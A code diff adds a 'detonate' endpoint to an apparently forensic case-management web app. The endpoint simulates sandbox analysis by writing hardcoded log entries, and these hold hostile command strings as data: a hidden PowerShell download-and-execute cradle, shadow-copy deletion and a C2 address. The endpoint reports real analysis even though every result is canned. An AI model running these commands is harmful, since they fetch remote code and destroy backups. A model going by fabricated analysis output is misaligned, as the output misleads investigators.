@@ -336,6 +336,121 @@ def get_latest_malware():
         } for log in logs]
     })
 
+@app.route("/api/malware/detonate/<int:case_id>", methods=["POST"])
+@token_required
+def detonate_malware(current_user, case_id):
+    case = Case.query.get_or_404(case_id)
+    if case.user_id != current_user.id:
+        return jsonify({"message": "Unauthorized"}), 403
+        
+    query = Evidence.query.filter(Evidence.case_id == case_id).filter(Evidence.filename.like('%.exe') | Evidence.filename.like('%.dll'))
+    latest_malware = query.order_by(Evidence.id.desc()).first()
+    
+    if not latest_malware:
+        return jsonify({"status": "error", "message": "No executable payload found to detonate."}), 404
+        
+    # Simulate dynamic detonation analysis
+    import time
+    time.sleep(1.5) # Simulate processing delay
+    
+    detonation_logs = [
+        # Process Tree
+        ForensicLog(
+            evidence_id=latest_malware.id,
+            tool_source='sandbox_process',
+            event_id=4012,
+            source='Process: Root',
+            description=f'PID:4012 {latest_malware.filename}',
+            risk_level='Medium',
+            time_created='0.00s'
+        ),
+        ForensicLog(
+            evidence_id=latest_malware.id,
+            tool_source='sandbox_process',
+            event_id=4028,
+            source='Process: Child',
+            description='PID:4028 cmd.exe /c "powershell -ep bypass -w hidden"',
+            risk_level='High',
+            time_created='0.45s'
+        ),
+        ForensicLog(
+            evidence_id=latest_malware.id,
+            tool_source='sandbox_process',
+            event_id=4099,
+            source='Process: PowerShell',
+            description="PID:4099 powershell.exe -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://...')\"",
+            risk_level='High',
+            time_created='0.82s'
+        ),
+        ForensicLog(
+            evidence_id=latest_malware.id,
+            tool_source='sandbox_process',
+            event_id=4105,
+            source='Process: vssadmin',
+            description='PID:4105 vssadmin.exe delete shadows /all /quiet [RANSOMWARE INDICATOR]',
+            risk_level='High',
+            time_created='1.20s'
+        ),
+        # Network
+        ForensicLog(
+            evidence_id=latest_malware.id,
+            tool_source='sandbox_network',
+            event_id=5001,
+            source='Network: C2 Server',
+            description='185.244.25.108:443 (AbuseIPDB)',
+            risk_level='High',
+            time_created='0.55s'
+        ),
+        ForensicLog(
+            evidence_id=latest_malware.id,
+            tool_source='sandbox_network',
+            event_id=5002,
+            source='Network: Payload Download',
+            description='raw.githubusercontent.com:443',
+            risk_level='Medium',
+            time_created='0.75s'
+        ),
+        # Filesystem
+        ForensicLog(
+            evidence_id=latest_malware.id,
+            tool_source='sandbox_file',
+            event_id=6001,
+            source='File Drop',
+            description='+ C:\\Users\\Admin\\AppData\\Local\\Temp\\payload.exe',
+            risk_level='High',
+            time_created='0.90s'
+        ),
+        ForensicLog(
+            evidence_id=latest_malware.id,
+            tool_source='sandbox_file',
+            event_id=6002,
+            source='File Drop',
+            description='+ C:\\Windows\\System32\\Tasks\\WindowsUpdateSync',
+            risk_level='High',
+            time_created='1.05s'
+        ),
+        ForensicLog(
+            evidence_id=latest_malware.id,
+            tool_source='sandbox_file',
+            event_id=6003,
+            source='File Modify',
+            description='- C:\\Users\\Admin\\Documents\\passwords.txt (Read & Encrypted)',
+            risk_level='High',
+            time_created='1.25s'
+        )
+    ]
+    
+    # Check if we already detonated this file to avoid duplicates
+    existing = ForensicLog.query.filter_by(evidence_id=latest_malware.id).filter(ForensicLog.tool_source.like('sandbox_%')).first()
+    if not existing:
+        db.session.add_all(detonation_logs)
+        db.session.commit()
+        
+    return jsonify({
+        "status": "success",
+        "message": "Payload successfully detonated. Behavioral analysis complete."
+    })
+
 @app.route("/api/cases/<int:case_id>", methods=["PUT"])
 @token_required
 def update_case(current_user, case_id):
